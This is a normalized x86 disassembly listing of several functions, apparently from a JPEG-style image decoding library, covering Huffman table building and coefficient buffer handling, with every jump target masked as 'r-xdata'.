mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x18 ]
cmp edx [ ecx + 0x34 ]
jge r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x14 ]
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + edx * 4 + 0x18 ]
mov ax [ ecx ]
mov [ edx ] ax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x14 ]
mov eax [ ebp - 0x14 ]
add eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + eax * 4 + 0x18 ]
mov cx [ edx ]
mov [ eax ] cx
jmp r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
sub_42d760
push ebp
mov ebp esp
sub esp 0x80
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x148 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xe0 ]
sub eax 0x1
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x1c ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x44 ]
mov [ ebp - 0x34 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
cmp eax [ edx + 0x3c ]
jge r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42da20
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
mov ecx [ ebp - 0x34 ]
mov edx [ ecx + 0xc ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x34 ]
mov edx [ eax + 0x8 ]
imul edx [ ecx + 0xc ]
push edx
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x40 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx + 0x20 ]
add esp 0x14
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx [ ebp - 0x8 ]
jae r-xdata
mov ecx [ ebp - 0x34 ]
mov esi [ ebp - 0x34 ]
mov eax [ ecx + 0x20 ]
xor edx edx
div [ esi + 0xc ]
mov [ ebp - 0x28 ] edx
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov edx [ ebp - 0x34 ]
mov eax [ edx + 0xc ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x34 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x20 ] ecx
mov eax [ ebp - 0xc ]
xor edx edx
div [ ebp - 0x20 ]
mov [ ebp - 0x2c ] edx
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov edx [ ebp - 0x34 ]
mov eax [ edx + 0xc ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x20 ]
sub edx [ ebp - 0x2c ]
mov [ ebp - 0x2c ] edx
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp - 0x28 ]
jge r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x38 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x3c ] ecx
mov edx [ ebp - 0xc ]
push edx
push 0x0
mov eax [ ebp - 0x24 ]
shl eax 0x3
push eax
mov ecx [ ebp - 0x3c ]
push ecx
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 ]
push ecx
mov edx [ ebp - 0x34 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x158 ]
call [ edx + 0x4 ]
add esp 0x1c
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx [ ebp - 0x2c ]
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0xc ]
xor edx edx
div [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
shl eax 0x7
mov ecx [ ebp - 0x3c ]
add ecx eax
mov [ ebp - 0x3c ] ecx
mov edx [ ebp - 0x2c ]
shl edx 0x7
push edx
mov eax [ ebp - 0x3c ]
push eax
call sub_420d70
add esp 0x8
mov ecx [ ebp - 0x3c ]
mov dx [ ecx - 0x80 ]
mov [ ebp - 0x30 ] dx
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x34 ]
add ecx 0x54
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x24 ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x2c ]
jge r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x38 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x3c ] edx
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x38 ]
mov edx [ ecx + eax * 4 - 0x4 ]
mov [ ebp - 0x40 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x7
push eax
mov ecx [ ebp - 0x3c ]
push ecx
call sub_420d70
add esp 0x8
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x18 ]
shl edx 0x7
mov eax [ ebp - 0x3c ]
mov cx [ ebp - 0x30 ]
mov [ eax + edx ] cx
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov ecx [ ebp - 0x20 ]
sub ecx 0x1
shl ecx 0x7
mov edx [ ebp - 0x40 ]
mov ax [ edx + ecx ]
mov [ ebp - 0x30 ] ax
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x20 ]
jge r-xdata
mov eax [ ebp - 0x20 ]
shl eax 0x7
mov ecx [ ebp - 0x3c ]
add ecx eax
mov [ ebp - 0x3c ] ecx
mov edx [ ebp - 0x20 ]
shl edx 0x7
mov eax [ ebp - 0x40 ]
add eax edx
mov [ ebp - 0x40 ] eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
shl eax 0x7
mov ecx [ ebp - 0x3c ]
mov dx [ ebp - 0x30 ]
mov [ ecx + eax ] dx
jmp r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
sub_42da20
push ebp
mov ebp esp
sub esp 0x78
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x148 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
cmp ecx [ eax + 0xe4 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
mov [ ebp - 0x1c ] ecx
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0xe8 ]
mov [ ebp - 0x38 ] ecx
push 0x0
mov edx [ ebp - 0x38 ]
mov eax [ edx + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x38 ]
mov eax [ ecx + 0x8 ]
imul eax [ edx + 0xc ]
push eax
mov ecx [ ebp - 0x38 ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x40 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx + 0x20 ]
add esp 0x14
mov edx [ ebp - 0x10 ]
mov [ ebp + edx * 4 - 0x30 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x1c ]
cmp ecx [ eax + 0x14 ]
jge r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
add eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] eax
mov edx [ ebp + 0x8 ]
push edx
call sub_42d410
add esp 0x4
mov al 0x1
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx + 0xf8 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] 0x0
jmp r-xdata
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x1c ]
add edx 0x1
mov [ ebp - 0x1c ] edx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
cmp eax [ edx + 0xe4 ]
jge r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x18
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x15c ]
call [ edx + 0x4 ]
add esp 0x8
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0xe8 ]
mov [ ebp - 0x38 ] eax
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
imul edx [ ecx + 0x34 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x1c ]
mov [ eax + 0x10 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
xor al al
jmp r-xdata
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x18 ]
cmp edx [ ecx + 0x38 ]
jge r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + ecx * 4 - 0x30 ]
mov ecx [ ebp - 0x20 ]
shl ecx 0x7
mov edx [ edx + eax * 4 ]
add edx ecx
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x14 ]
cmp edx [ ecx + 0x34 ]
jge r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
mov [ ecx + eax * 4 + 0x18 ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x34 ]
add ecx 0x80
mov [ ebp - 0x34 ] ecx
jmp r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
sub_42dc30
push ebp
mov ebp esp
sub esp 0x570
push ebx
push esi
push edi
cmp [ ebp + 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x32
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
cmp [ ebp + 0x10 ] 0x4
jl r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x68 ]
mov [ ebp - 0x530 ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x58 ]
mov [ ebp - 0x530 ] edx
jmp r-xdata
mov edx [ ebp + 0xc ]
and edx 0xff
test edx edx
je r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x32
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x10 ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov eax [ ebp - 0x530 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
push 0x500
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
call [ eax ]
add esp 0xc
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
cmp [ ebp - 0x14 ] 0x10
jg r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + eax - 0x124 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x52c ] 0x0
movsx edx [ ebp - 0x124 ]
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] 0x0
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
push 0x100
push 0x0
mov ecx [ ebp - 0x8 ]
add ecx 0x400
push ecx
call memset
add esp 0xc
mov edx [ ebp + 0xc ]
and edx 0xff
neg edx
sbb edx edx
and dl 0x10
add edx 0xff
mov [ ebp - 0x20 ] edx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov edx [ ebp - 0xc ]
movsx eax [ ebp + edx - 0x124 ]
cmp eax [ ebp - 0x1c ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x8
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov ecx [ ebp - 0xc ]
add ecx [ ebp - 0x10 ]
cmp ecx 0x100
jle r-xdata
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x18 ]
jge r-xdata
mov edx 0x1
mov ecx [ ebp - 0x1c ]
shl edx cl
cmp [ ebp - 0x52c ] edx
jl r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x52c ]
mov [ ebp + ecx * 4 - 0x528 ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x52c ]
add ecx 0x1
mov [ ebp - 0x52c ] ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
mov cl [ ebp - 0x14 ]
mov [ ebp + eax - 0x124 ] cl
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
sub edx 0x1
mov [ ebp - 0x10 ] edx
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
xor eax eax
mov al [ edx + 0x11 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov edx [ ebp - 0x52c ]
shl edx 0x1
mov [ ebp - 0x52c ] edx
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x8
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x8
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0xc ]
movsx ecx [ ebp + eax - 0x124 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x10 ]
movsx eax [ edx + 0x400 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov edx [ ebp + edx * 4 - 0x528 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + ecx - 0x124 ]
mov [ eax + 0x400 ] dl
jmp r-xdata
sub_42df10
push ebp
mov ebp esp
sub esp 0x884
push ebx
push esi
push edi
push 0x21
push 0x0
lea eax [ ebp - 0x24 ]
push eax
call memset
add esp 0xc
push 0x404
push 0x0
lea ecx [ ebp - 0x428 ]
push ecx
call memset
add esp 0xc
mov [ ebp - 0x83c ] 0x0
jmp r-xdata
cmp [ ebp - 0x83c ] 0x101
jge r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ecx + 0x400 ] 0x1
mov eax [ ebp - 0x83c ]
mov [ ebp + eax * 4 - 0x82c ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x83c ] 0x100
jg r-xdata
mov edx [ ebp - 0x83c ]
add edx 0x1
mov [ ebp - 0x83c ] edx
mov [ ebp - 0x834 ] 0xffffffff
mov [ ebp - 0x844 ] 0x3b9aca00
mov [ ebp - 0x83c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x83c ]
mov ecx [ ebp + 0x10 ]
cmp [ ecx + eax * 4 ] 0x0
je r-xdata
cmp [ ebp - 0x83c ] 0x100
jg r-xdata
jmp r-xdata
mov edx [ ebp - 0x83c ]
mov eax [ ebp + 0x10 ]
mov ecx [ eax + edx * 4 ]
cmp ecx [ ebp - 0x844 ]
jg r-xdata
cmp [ ebp - 0x834 ] 0x0
jge r-xdata
mov ecx [ ebp - 0x83c ]
mov edx [ ebp + 0x10 ]
cmp [ edx + ecx * 4 ] 0x0
je r-xdata
mov edx [ ebp - 0x83c ]
add edx 0x1
mov [ ebp - 0x83c ] edx
mov edx [ ebp - 0x83c ]
mov eax [ ebp + 0x10 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x844 ] ecx
mov edx [ ebp - 0x83c ]
mov [ ebp - 0x830 ] edx
mov edx [ ebp - 0x830 ]
mov eax [ ebp + 0x10 ]
mov ecx [ eax + edx * 4 ]
mov edx [ ebp - 0x834 ]
mov eax [ ebp + 0x10 ]
add ecx [ eax + edx * 4 ]
mov edx [ ebp - 0x830 ]
mov eax [ ebp + 0x10 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0x834 ]
mov edx [ ebp + 0x10 ]
mov [ edx + ecx * 4 ] 0x0
mov eax [ ebp - 0x830 ]
mov ecx [ ebp + eax * 4 - 0x428 ]
add ecx 0x1
mov edx [ ebp - 0x830 ]
mov [ ebp + edx * 4 - 0x428 ] ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x83c ]
mov ecx [ ebp + 0x10 ]
mov edx [ ecx + eax * 4 ]
cmp edx [ ebp - 0x844 ]
jg r-xdata
mov eax [ ebp - 0x830 ]
mov ecx [ ebp - 0x834 ]
mov [ ebp + eax * 4 - 0x82c ] ecx
mov edx [ ebp - 0x834 ]
mov eax [ ebp + edx * 4 - 0x428 ]
add eax 0x1
mov ecx [ ebp - 0x834 ]
mov [ ebp + ecx * 4 - 0x428 ] eax
mov ecx [ ebp - 0x830 ]
mov edx [ ebp + ecx * 4 - 0x82c ]
mov [ ebp - 0x830 ] edx
mov eax [ ebp - 0x830 ]
mov ecx [ ebp + eax * 4 - 0x428 ]
add ecx 0x1
mov edx [ ebp - 0x830 ]
mov [ ebp + edx * 4 - 0x428 ] ecx
jmp r-xdata
mov [ ebp - 0x83c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x83c ]
add eax 0x1
mov [ ebp - 0x83c ] eax
mov eax [ ebp - 0x83c ]
cmp eax [ ebp - 0x830 ]
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x834 ]
mov ecx [ ebp + eax * 4 - 0x82c ]
mov [ ebp - 0x834 ] ecx
mov edx [ ebp - 0x834 ]
mov eax [ ebp + edx * 4 - 0x428 ]
add eax 0x1
mov ecx [ ebp - 0x834 ]
mov [ ebp + ecx * 4 - 0x428 ] eax
jmp r-xdata
mov eax [ ebp - 0x830 ]
cmp [ ebp + eax * 4 - 0x82c ] 0x0
jl r-xdata
cmp [ ebp - 0x83c ] 0x100
jg r-xdata
mov ecx [ ebp - 0x83c ]
mov edx [ ebp + 0x10 ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x844 ] eax
mov ecx [ ebp - 0x83c ]
mov [ ebp - 0x834 ] ecx
mov [ ebp - 0x830 ] 0xffffffff
mov [ ebp - 0x844 ] 0x3b9aca00
mov [ ebp - 0x83c ] 0x0
jmp r-xdata
mov edx [ ebp - 0x834 ]
cmp [ ebp + edx * 4 - 0x82c ] 0x0
jl r-xdata
mov [ ebp - 0x83c ] 0x20
jmp r-xdata
mov eax [ ebp - 0x83c ]
cmp [ ebp + eax * 4 - 0x428 ] 0x0
je r-xdata
cmp [ ebp - 0x83c ] 0x10
jle r-xdata
jmp r-xdata
mov ecx [ ebp - 0x83c ]
cmp [ ebp + ecx * 4 - 0x428 ] 0x20
jle r-xdata
mov ecx [ ebp - 0x83c ]
xor edx edx
mov dl [ ebp + ecx - 0x24 ]
test edx edx
jne r-xdata
mov ecx [ ebp - 0x83c ]
xor edx edx
mov dl [ ebp + ecx - 0x24 ]
test edx edx
jle r-xdata
mov edx [ ebp - 0x83c ]
add edx 0x1
mov [ ebp - 0x83c ] edx
mov ecx [ ebp - 0x83c ]
mov edx [ ebp + ecx * 4 - 0x428 ]
mov al [ ebp + edx - 0x24 ]
add al 0x1
mov ecx [ ebp - 0x83c ]
mov edx [ ebp + ecx * 4 - 0x428 ]
mov [ ebp + edx - 0x24 ] al
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x27
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov ecx [ ebp - 0x83c ]
mov dl [ ebp + ecx - 0x24 ]
sub dl 0x1
mov eax [ ebp - 0x83c ]
mov [ ebp + eax - 0x24 ] dl
push 0x11
lea ecx [ ebp - 0x24 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call memcpy
add esp 0xc
mov [ ebp - 0x838 ] 0x0
mov [ ebp - 0x83c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x83c ]
sub eax 0x1
mov [ ebp - 0x83c ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x83c ]
sub eax 0x2
mov [ ebp - 0x840 ] eax
cmp [ ebp - 0x83c ] 0x20
jg r-xdata
mov eax [ ebp - 0x83c ]
sub eax 0x1
mov [ ebp - 0x83c ] eax
mov ecx [ ebp - 0x83c ]
mov dl [ ebp + ecx - 0x24 ]
sub dl 0x2
mov eax [ ebp - 0x83c ]
mov [ ebp + eax - 0x24 ] dl
mov ecx [ ebp - 0x83c ]
mov dl [ ebp + ecx - 0x25 ]
add dl 0x1
mov eax [ ebp - 0x83c ]
mov [ ebp + eax - 0x25 ] dl
mov ecx [ ebp - 0x840 ]
mov dl [ ebp + ecx - 0x23 ]
add dl 0x2
mov eax [ ebp - 0x840 ]
mov [ ebp + eax - 0x23 ] dl
mov ecx [ ebp - 0x840 ]
mov dl [ ebp + ecx - 0x24 ]
sub dl 0x1
mov eax [ ebp - 0x840 ]
mov [ ebp + eax - 0x24 ] dl
jmp r-xdata
mov eax [ ebp - 0x840 ]
sub eax 0x1
mov [ ebp - 0x840 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x111 ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x840 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x840 ]
xor edx edx
mov dl [ ebp + ecx - 0x24 ]
test edx edx
jne r-xdata
cmp [ ebp - 0x840 ] 0xff
jg r-xdata
jmp r-xdata
mov edx [ ebp - 0x840 ]
mov eax [ ebp + edx * 4 - 0x428 ]
cmp eax [ ebp - 0x83c ]
jne r-xdata
mov eax [ ebp - 0x83c ]
add eax 0x1
mov [ ebp - 0x83c ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0x838 ]
mov dl [ ebp - 0x840 ]
mov [ ecx + 0x11 ] dl
mov eax [ ebp - 0x838 ]
add eax 0x1
mov [ ebp - 0x838 ] eax
mov ecx [ ebp - 0x840 ]
add ecx 0x1
mov [ ebp - 0x840 ] ecx
sub_42e3f0
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push 0x6c
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x15c ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_42e480
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
cmp [ ebp - 0x8 ] 0x4
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x3c ] 0x0
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 4 + 0x2c ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x5c ] 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x4c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
sub_42e480
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x15c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0xc ]
and edx 0xff
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_42e6a0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] sub_42edd0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_42ee70
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] sub_42f110
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx + 0xe4 ]
jge r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xbc ]
mov [ ecx + 0x24 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x28 ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0xe8 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0xc ]
and edx 0xff
test edx edx
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
